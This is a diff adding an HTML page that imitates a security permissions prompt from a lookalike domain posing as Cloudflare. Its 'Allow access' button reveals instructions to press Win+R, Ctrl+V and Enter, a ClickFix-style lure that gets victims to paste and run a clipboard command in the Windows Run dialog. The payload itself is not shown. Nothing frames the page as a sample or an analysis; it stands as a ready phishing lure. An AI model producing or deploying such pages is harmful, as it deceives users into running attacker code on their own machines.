@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:1rem}
+.modal{background:#fff;border-radius:12px;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.12);overflow:hidden}
+.header{background:#0078d4;padding:1.2rem 1.5rem;color:#fff}
+.header h2{font-size:1rem;font-weight:600;margin-bottom:.25rem}
+.header p{font-size:.75rem;opacity:.85}
+.body{padding:1.5rem}
+.perm{display:flex;align-items:flex-start;gap:.6rem;padding:.5rem 0;border-bottom:1px solid #f0f0f0}
+.perm:last-child{border:none}
+.perm-icon{font-size:1.1rem;flex-shrink:0;margin-top:2px}
+.perm-text{font-size:.8rem;color:#333;line-height:1.4}
+.perm-text strong{display:block;color:#1a1a1a;font-size:.82rem}
+.actions{display:flex;gap:.5rem;padding:1rem 1.5rem;background:#fafafa;border-top:1px solid #eee}
+.btn{flex:1;padding:.6rem;border-radius:6px;font-size:.82rem;font-weight:600;cursor:pointer;border:none;text-align:center}
+.btn-allow{background:#0078d4;color:#fff}
+.btn-deny{background:#e0e0e0;color:#666}
+.alert{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:.75rem;margin-top:.75rem;font-size:.75rem;color:#664d03;display:none}
+</style></head><body>
+<div class="modal">
+  <div class="header">
+    <h2>Permissions requested</h2>
+    <p>verify-access.cloudflare-cdn.com wants to:</p>
+  </div>
+  <div class="body">
+    <div class="perm"><span class="perm-icon">&#128274;</span><div class="perm-text"><strong>Verify your identity</strong>Complete a security check to continue</div></div>
+    <div class="perm"><span class="perm-icon">&#128196;</span><div class="perm-text"><strong>Access page content</strong>Read and display the requested document</div></div>
+    <div class="perm"><span class="perm-icon">&#9989;</span><div class="perm-text"><strong>Confirm you are human</strong>One-time verification required</div></div>
+    <div class="alert" id="alert">
+      <strong>Verification required:</strong> Press Win+R, then Ctrl+V, then Enter to complete the security check.
+    </div>
+  </div>
+  <div class="actions">
+    <button class="btn btn-deny">Deny</button>
+    <button class="btn btn-allow" onclick="document.getElementById('alert').style.display='block'">Allow access</button>
+  </div>
+</div>
+</body></html>
